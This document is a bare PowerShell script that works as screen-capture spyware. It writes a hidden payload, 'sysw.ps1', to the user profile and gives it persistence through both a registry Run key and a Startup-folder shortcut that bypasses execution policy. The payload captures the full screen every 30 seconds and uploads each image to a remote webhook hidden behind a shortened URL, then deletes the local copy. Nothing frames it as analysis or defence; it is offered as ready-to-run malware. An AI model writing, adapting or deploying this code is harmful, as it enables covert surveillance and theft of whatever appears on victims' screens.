$scriptContent = @"
\$hookurl = "https://bit.ly/chu_kbras"
\$seconds = 30 # Intervalo entre capturas

if (\$hookurl.Length -le 121) {
    Write-Host "Shortened Webhook URL Detected!!!."
    \$hookurl = (Invoke-RestMethod -Uri \$hookurl).url
}

\$scriptPath = \$MyInvocation.MyCommand.Path

\$regPath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
Set-ItemProperty -Path \$regPath -Name "ScreenshotScript" -Value \$scriptPath

do {
    \$Filett = "\$env:temp\SC.png"
    Add-Type -AssemblyName System.Windows.Forms
    Add-type -AssemblyName System.Drawing
    \$Screen = [System.Windows.Forms.SystemInformation]::VirtualScreen
    \$Width = \$Screen.Width
    \$Height = \$Screen.Height
    \$Left = \$Screen.Left
    \$Top = \$Screen.Top
    \$bitmap = New-Object System.Drawing.Bitmap \$Width, \$Height
    \$graphic = [System.Drawing.Graphics]::FromImage(\$bitmap)
    \$graphic.CopyFromScreen(\$Left, \$Top, 0, 0, \$bitmap.Size)
    \$bitmap.Save(\$Filett, [System.Drawing.Imaging.ImageFormat]::png)
    Start-Sleep 1
    if (Test-Path \$env:SYSTEMROOT\System32\curl.exe) {
        Invoke-WebRequest -Uri \$hookurl -Method POST -InFile \$Filett
    } else {
        Write-Host "curl.exe not found. Unable to send screenshot."
    }
    Start-Sleep 1
    Remove-Item -Path \$Filett
    Start-Sleep \$seconds
} while (\$true)
"@

$output = "$env:USERPROFILE\sysw.ps1"

Set-Content -Path $output -Value $scriptContent

$shortcutLocation = "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\sysw.lnk"
$shell = New-Object -ComObject WScript.Shell
$shortcut = $shell.CreateShortcut($shortcutLocation)
$shortcut.TargetPath = "powershell.exe"
$shortcut.Arguments = "-ExecutionPolicy Bypass -File $output"
$shortcut.Save()

Start-Process powershell.exe -ArgumentList "-ExecutionPolicy Bypass -File $output"
